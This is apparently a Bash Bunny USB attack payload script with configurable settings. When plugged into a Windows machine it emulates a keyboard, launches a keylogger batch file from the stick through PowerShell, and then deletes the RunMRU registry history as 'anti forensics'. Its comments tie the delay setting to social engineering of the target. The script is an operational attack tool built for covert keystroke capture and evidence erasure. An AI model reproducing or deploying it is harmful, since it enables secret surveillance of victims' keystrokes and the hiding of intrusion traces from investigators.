# ----- SETTINGS -----

# Set this to the keyboard of your target machine
KEYBOARD_LAYOUT="us"

# May be useful when combined with an social engineering attack (So the target doesn't relate the popups to the usb stick)
PRE_DELAY="0"

# Advanced anti forensics... Just trust me :D
CLEANUP="yes"

# ----- PAYLOAD ------
LED SETUP
DUCKY_LANG $KEYBOARD_LAYOUT

ATTACKMODE HID STORAGE
Q DELAY $PRE_DELAY

LED ATTACK
# Launch keylogger
RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\b.cmd')"

# The part no one wants to do
if [ "$CLEANUP" == "yes" ]
then
	LED STAGE2
	Q DELAY 2000 # Wait for the powershell to be vanished
	RUN WIN REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
fi

LED FINISH